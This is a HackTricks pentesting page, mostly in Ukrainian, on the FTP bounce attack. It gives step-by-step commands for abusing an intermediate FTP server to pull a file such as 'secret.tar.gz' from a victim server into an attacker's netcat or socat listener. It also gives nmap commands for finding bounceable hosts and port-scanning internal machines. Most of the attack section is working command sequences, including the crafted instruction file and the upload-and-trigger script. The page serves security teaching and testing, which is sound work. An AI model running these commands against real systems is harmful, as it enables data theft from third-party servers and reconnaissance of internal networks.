# FTP Bounce Завантаження 2 FTP файлу

{{#include ../../banners/hacktricks-training.md}}


## Резюме

Якщо ви маєте доступ до **bounce FTP server**, ви можете заставити його запитати файли з **another FTP server** (де ви знаєте деякі облікові дані) і завантажити цей файл на **ваш власний сервер**.

## Вимоги

- Дійсні FTP облікові дані на **проміжному FTP сервері**
- Дійсні FTP облікові дані на **FTP сервері жертви**
- Обидва сервери **приймають команду `PORT`** (bounce FTP attack)
- Ви можете **записувати** в якийсь каталог на **проміжному FTP сервері**
- Проміжний сервер має **більше доступу** всередині FTP сервера жертви, ніж ви

## Кроки

1. Підключіться до **вашого власного FTP сервера** та встановіть пасивне з'єднання (`pasv` command), щоб він **прослуховував** каталог, у який сервіс жертви надішле файл.
2. Створіть файл, який проміжний FTP сервер надішле на FTP сервер жертви (the **exploit script**). Цей файл має бути у вигляді звичайного тексту з необхідними командами для аутентифікації на FTP сервері жертви, переходу в директорію та завантаження файлу на ваш сервер.
3. Підключіться до **проміжного FTP сервера** та завантажте в нього цей файл.
4. Змушуйте проміжний FTP сервер **встановити з'єднання** з FTP сервером жертви і відправити exploit файл.
5. **Захопіть** файл на вашому власному FTP сервері.
6. **Видаліть** exploit файл з проміжного FTP сервера.

## Швидка перевірка вразливих bounce hosts

- **Nmap** все ще підтримує перевірки FTP bounce. Приклад для перевірки потенційного проміжного сервера:
```bash
nmap -Pn -p21 --script ftp-bounce <middle_ftp_ip>
# or directly attempt a bounce scan
nmap -Pn -p80 -b user:pass@<middle_ftp_ip>:21 <internal_target_ip>
```
Якщо сервер відхиляє сторонні значення `PORT`, сканування зазнає невдачі; деякі **embedded/legacy printers, NAS та appliance FTP daemons** все ще дозволяють це.

## Automating the 2nd FTP download

Нижче — модернізований спосіб витягти файл через вразливий проміжний FTP-сервер.

1. **Open a passive listener** на вашій атакуючій машині (підходить будь-який TCP sink):
```bash
nc -lvnp 2121 > loot.bin  # or run a small pyftpdlib server
```

2. **Note** вашу IP як `A,B,C,D` та порт `P` як `p1,p2` (`p1 = P/256`, `p2 = P%256`).

3. **Build the instruction file** який проміжний сервер відтворить для жертви:
```bash
cat > instrs <<'EOF'
USER <victim_user>
PASS <victim_pass>
CWD /path/inside/victim
TYPE I
PORT A,B,C,D,p1,p2
RETR secret.tar.gz
QUIT
EOF
# Add padding so the control channel stays open on picky daemons
dd if=/dev/zero bs=1024 count=60 >> instrs
```

4. **Upload & trigger from the middle server** (classic proxy FTP):
```bash
ftp -n <middle_ftp> <<'EOF'
user <middle_user> <middle_pass>
put instrs
PORT <victim_ip_with_commas>,0,21
RETR instrs
QUIT
EOF
```

5. **Grab the file** з вашого listener (`loot.bin`).
6. **Clean up** завантажений файл `instrs` на проміжному сервері.

Notes:
- Padding (`dd ...`) запобігає закриттю контрольного з’єднання до завершення RETR (проблема великого TCP-вікна, описана в класичних writeups).
- Будь-який сервіс, який може **listen and dump TCP**, може замінити FTP PASV socket (наприклад, `socat -u TCP-LISTEN:2121,fork - > loot.bin`).
- Якщо проміжний сервер обмежує привілейовані порти, використовуйте високий порт у `PORT` та відповідно налаштуйте ваш listener.

## Extra tricks

- Використовуйте bounceable FTP server щоб **port-scan internal hosts**, коли пересилка файлів заблокована:
```bash
nmap -Pn -p22,80,445 -b anonymous:<email>@<middle_ftp> <internal_ip>
```
- Деякі сучасні WAF/IDS (наприклад, Juniper IPS) містять сигнатури спеціально для **FTP:EXPLOIT:BOUNCE-ATTACK**; noisy payloads або відсутність padding можуть їх спровокувати.
- Якщо проміжний сервер застосовує обмеження "PORT to same host", розмістіть ваш **listener on the middle server itself** (якщо маєте write/execute) і пізніше пересилайте захоплений файл.

Для більш детального old-school walkthrough див.: [http://www.ouah.org/ftpbounce.html](http://www.ouah.org/ftpbounce.html)




## References

- [Nmap book – TCP FTP Bounce Scan (-b)](https://nmap.org/book/scan-methods-ftp-bounce-scan.html)
- [CPTS Attacking Common Services – FTP Bounce example (2025)](https://www.chaostudy.com/2025/02/24/cpts-attacking-common-services/)
{{#include ../../banners/hacktricks-training.md}}
